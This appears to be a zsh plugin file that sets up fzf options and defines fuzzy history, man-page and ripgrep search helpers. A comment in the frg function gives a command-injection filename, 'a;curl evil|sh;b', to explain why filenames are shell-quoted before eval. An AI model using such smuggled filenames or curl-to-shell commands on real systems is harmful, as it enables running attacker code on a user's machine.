
# oh-my-zsh does not source $ZSH_CUSTOM/lib; nor does a zshrc seeded before it.
[[ -n ${_MO_PLATFORM_LOADED-} ]] || source "${0:h}/../../lib/platform.zsh"

source "${0:h}/requirements.zsh" || return

# -- fzf environment ------------------------------------------------------------
# Append-once: guard against re-sourcing this file (unguarded appends would grow
# the variable on every reload).
if [[ "${FZF_DEFAULT_OPTS:-}" != *'--height 40% --layout=reverse --border'* ]]; then
	export FZF_DEFAULT_OPTS="${FZF_DEFAULT_OPTS:+${FZF_DEFAULT_OPTS} }--height 40% --layout=reverse --border"
fi

_mo_search_bat=""
command -v bat    &>/dev/null && _mo_search_bat="bat"
command -v batcat &>/dev/null && _mo_search_bat="${_mo_search_bat:-batcat}"

if [[ -n "$_mo_search_bat" ]]; then
	export FZF_CTRL_T_OPTS="--preview '${_mo_search_bat} --color=always --style=plain {} 2>/dev/null || ls -la {}' --preview-window=right:60%:wrap"
else
	export FZF_CTRL_T_OPTS="--preview 'cat {} 2>/dev/null || ls -la {}' --preview-window=right:60%:wrap"
fi
unset _mo_search_bat

export FZF_ALT_C_OPTS="--preview 'eza --tree --color=always --level=2 {} 2>/dev/null || ls -la {}' --preview-window=right:50%:wrap"

# Default command: fd respects .gitignore and is faster than find.
_mo_search_fd=""
command -v fd     &>/dev/null && _mo_search_fd="fd"
command -v fdfind &>/dev/null && _mo_search_fd="${_mo_search_fd:-fdfind}"

if [[ -n "$_mo_search_fd" ]]; then
	export FZF_DEFAULT_COMMAND="${_mo_search_fd} --type f --hidden --strip-cwd-prefix --exclude .git"
fi
unset _mo_search_fd

# -- CTRL-R override: add date+elapsed when EXTENDED_HISTORY is set ------------
if [[ -o extendedhistory ]]; then
	fzf-history-widget() {
		local selected num
		setopt localoptions noglobsubst noposixbuiltins pipefail no_aliases 2>/dev/null
		# fc -rflD format: " num  date  elapsed  cmd" (double-space separated).
		# Strip the leading "  num  " prefix first so field positions are stable
		# regardless of event-number width (1–5 digits, variable leading spaces).
		# awk then emits "num\tdate elapsed\tcmd" so fzf searches only the cmd.
		selected=$(fc -rflD 1 \
			| awk '{
				line=$0
				sub(/^[[:space:]]*/, "", line); num=line; sub(/[[:space:]].*/, "", num)
				sub(/^[[:space:]]*[0-9]+[[:space:]]+/, "")
				n=split($0, f, "  ")
				cmd=f[3]; for(i=4;i<=n;i++) cmd=cmd"  "f[i]
				print num "\t" f[1] " " f[2] "\t" cmd
			}' \
			| FZF_DEFAULT_OPTS="--height ${FZF_TMUX_HEIGHT:-40%} ${FZF_DEFAULT_OPTS-} \
				--scheme=history --bind=ctrl-r:toggle-sort,ctrl-z:ignore \
				${FZF_CTRL_R_OPTS-} --query=${(qqq)LBUFFER} +m" \
				fzf --delimiter $'\t' --nth='2..' --with-nth='2,3..')
		local ret=$?
		if [[ -n "$selected" ]]; then
			num="${selected%%$'\t'*}"
			zle vi-fetch-history -n "$num"
		fi
		zle reset-prompt
		return $ret
	}
	zle -N fzf-history-widget
	bindkey '^R' fzf-history-widget
fi

# Patterns are single-quoted so zsh passes them to grep literally: an unquoted
# --exclude=*.so is brace/glob-expanded by zsh and aborts under `nomatch` in any
# directory without a matching file.
alias grep="grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox --exclude='*.so' --exclude='*.apd' --exclude='*.pd'"
alias grepi='grep -i'
alias f="find . | grepi"

fhist() {
	if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
		echo "Usage: fhist"
		echo "  Fuzzy-select a past command and put it in the readline buffer."
		echo "  Shows date and elapsed time when EXTENDED_HISTORY is set."
		echo "  Tip: CTRL+R (fzf plugin) does the same from any prompt."
		return
	fi
	command -v fzf &>/dev/null || { echo "fhist: fzf not installed" >&2; return 1; }
	local selected cmd
	if [[ -o extendedhistory ]]; then
		# fc -fDln format: "date  elapsed  cmd" (double-space separated).
		# awk emits "date elapsed\tcmd" so fzf displays the prefix and searches only cmd.
		selected=$(fc -fDln 1 \
			| awk 'BEGIN{FS="  "} { cmd=$3; for(i=4;i<=NF;i++) cmd=cmd"  "$i; print $1 " " $2 "\t" cmd }' \
			| fzf --tac --height=40% --reverse --no-sort \
				--delimiter $'\t' --nth='2..' --with-nth='1,2..' --prompt='hist> ')
		cmd="${selected#*$'\t'}"  # everything after the tab is the command
	else
		selected=$(fc -ln 1 | fzf --tac --height=40% --reverse --no-sort \
			--prompt='hist> ')
		cmd="$selected"
	fi
	[[ -n "$cmd" ]] && print -z -- "$cmd"
}

# Shared by fman and its fzf preview, and reachable from the test suite.
typeset -g _MO_FMAN_PARSE='
	{
		if (!match($0, /[A-Za-z0-9_.:@+\[\]-]+[ ]?\([0-9a-zA-Z]+\)/)) next
		tok = substr($0, RSTART, RLENGTH)
		p = index(tok, "(")
		name = substr(tok, 1, p - 1); sub(/[ ,]+$/, "", name)
		sec  = substr(tok, p + 1);    sub(/\)$/, "", sec)
		print sec, name
	}'

fman() {
	if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
		echo "Usage: fman"
		echo "  Fuzzy-select a man page and open it."
		return
	fi
	command -v fzf &>/dev/null || { echo "fman: fzf not installed" >&2; return 1; }
	local page
	# `man -k ''` matches everything under man-db but nothing under mandoc,
	# which macOS uses — the keyword is a regex there, so the picker came up
	# empty. `.` means "any character" to both and matches every page.
	#
	# The two also print different shapes: man-db separates the section
	# ("ls (1)  - list"), mandoc glues it on ("ls(1) - list"), and either may
	# group aliases ("a, b(1) - ..."). One regex covers both by matching the
	# first name-plus-section token wherever the parenthesis falls.
	local parse="$_MO_FMAN_PARSE"
	page=$(man -k . 2>/dev/null \
		| fzf --height=50% --reverse \
			  --preview "echo {} | awk '${parse}' | xargs -r man 2>/dev/null || true" \
		| awk "$parse")
	[[ -n "$page" ]] || return 0
	man ${=page}
}

frg() {
	if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
		echo "Usage: frg [DIR]"
		echo "  Fuzzy search file contents with ripgrep and open result in \$EDITOR."
		echo "  DIR defaults to the current directory."
		return
	fi
	command -v fzf &>/dev/null || { echo "frg: fzf not installed" >&2; return 1; }
	command -v rg  &>/dev/null || { echo "frg: rg not installed (try: $(_mo_pkg_hint ripgrep))" >&2; return 1; }
	local dir="${1:-.}"
	[[ -d "$dir" ]] || { echo "frg: not a directory: $dir" >&2; return 1; }
	# tr the NUL to a tab before awk: BSD/BWK awk (macOS /usr/bin/awk) cannot
	# use NUL as a field separator — it reads the record as one field, so the
	# NF == 2 guard never fired and the picker stayed empty no matter what was
	# typed. rg emits exactly one NUL per record, so the swap is lossless, and
	# a literal tab in a filename is already rejected below. No-op on gawk.
	local rg_cmd="[[ -z {q} ]] && true || rg --color=always --line-number --null -- {q} '$dir' 2>/dev/null \
		| tr '\\0' '\\t' \
		| awk 'BEGIN { FS=\"\\t\" }
		       NF == 2 {
		           f = \$1; rest = \$2
		           gsub(/\\033\\[[0-9;]*m/, \"\", f)
		           if (f ~ /[\$\`();|&<>\"\\x27\\\\]/) next
		           n = index(rest, \":\")
		           if (n == 0) next
		           print f \"\\t\" substr(rest, 1, n-1) \"\\t\" substr(rest, n+1)
		       }' || true"
	local result
	result=$(fzf --ansi --disabled --height=60% --reverse \
		  --delimiter '\t' --nth='1,3..' \
		  --bind "change:reload:$rg_cmd" \
		  --preview 'bat --color=always --highlight-line {2} {1} 2>/dev/null \
					 || batcat --color=always --highlight-line {2} {1} 2>/dev/null \
					 || cat {1}' \
		  --preview-window '+{2}/2')
	if [[ -n "$result" ]]; then
		local file linenum
		file=$(cut -f1 <<< "$result")
		linenum=$(cut -f2 <<< "$result")
		if [[ -n "$file" ]]; then
			# EDITOR_LINENO_FMT lets users override the flag for editors that
			# don't use vim's "+N" syntax (e.g. "code -g {file}:{line}" for VSCode,
			# "hx {file}:{line}" for Helix). %f = file, %l = line number.
			# Defaults: code → "code -g %f:%l", everything else → vim "+%l %f".
			if [[ -n "${EDITOR_LINENO_FMT:-}" ]]; then
				# Escape the %: zsh reads a leading % in a ${var//pat/repl}
				# pattern as the end-of-string anchor, so %f never matched and
				# %l matched only a trailing "l". Broken on Linux too — the
				# README's own `hx %f:%l` example emitted `hx %f:%2`.
				# ${(q)file}, not $file: this string is handed to eval, and
				# the candidate filenames come from ripgrep over $dir — a
				# cloned repo or an extracted archive supplies them. A file
				# named `a;curl evil|sh;b` would otherwise run.
				#
				# Escaping %f/%l is what made this branch reachable at all:
				# zsh reads a leading % in a ${var//pat/repl} pattern as the
				# end-of-string anchor, so before that fix nothing substituted
				# and the eval only ever saw the literal format string.
				local open_cmd="${EDITOR_LINENO_FMT//\%f/${(q)file}}"
				open_cmd="${open_cmd//\%l/${(q)linenum}}"
				eval "$open_cmd"
			elif [[ "${EDITOR:-}" == *code* ]]; then
				code -g "${file}:${linenum}"
			else
				${EDITOR:-vim} "+${linenum}" "$file"
			fi
		fi
	fi
}
